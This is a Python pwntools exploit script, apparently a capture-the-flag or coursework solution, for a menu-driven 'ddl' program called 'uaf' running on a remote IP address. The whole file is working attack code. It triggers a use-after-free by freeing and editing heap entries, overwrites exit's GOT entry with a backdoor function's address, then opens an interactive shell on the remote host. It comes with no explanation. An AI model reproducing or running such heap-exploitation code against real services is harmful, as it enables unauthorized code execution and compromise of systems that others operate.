from pwn import *
import struct
context.log_level = 'DEBUG'
e = ELF('./uaf')
backdoor_addr = e.symbols['backdoor'];
exit_got = e.got['exit']
print(hex(backdoor_addr),hex(exit_got))
print(backdoor_addr,exit_got);
conn = remote("47.99.80.189", 10030)

def create_ddl():
    conn.recvuntil("chocie:")
    conn.sendline("1")
    conn.recvuntil("the ddl time")
    conn.sendline("aaaa")
    conn.recvuntil("the ddl content")
    conn.sendline("content")

def create_ddl_wow():
    conn.recvuntil("chocie:")
    conn.sendline("1")
    conn.recvuntil("the ddl time")
    conn.sendline(p64(backdoor_addr))
    conn.recvuntil("the ddl content")
    conn.sendline("content")

def finish_ddl(x):
    conn.recvuntil("chocie:")
    conn.sendline("2")
    conn.recvuntil("the ddl index")
    conn.sendline(x)

def edit_ddl(x):
    conn.recvuntil("chocie:")
    conn.sendline("4")
    conn.recvuntil("the ddl index")
    conn.sendline(x)
    conn.recvuntil("the new ddl time")
    conn.sendline(p64(exit_got))
    conn.recvuntil("new ddl content")
    conn.sendline('content')

def show_ddl(x):
    conn.recvuntil("chocie:")
    conn.sendline("3")
    conn.recvuntil("the ddl index")
    conn.sendline(x)

conn.recvuntil("ID:\n")
conn.sendline("3180104933")
create_ddl()
create_ddl()
create_ddl()
finish_ddl('1')
finish_ddl('2')
edit_ddl('2')
show_ddl('2')
create_ddl()
create_ddl_wow()

conn.recvuntil("chocie:")
conn.sendline("5")
conn.interactive()
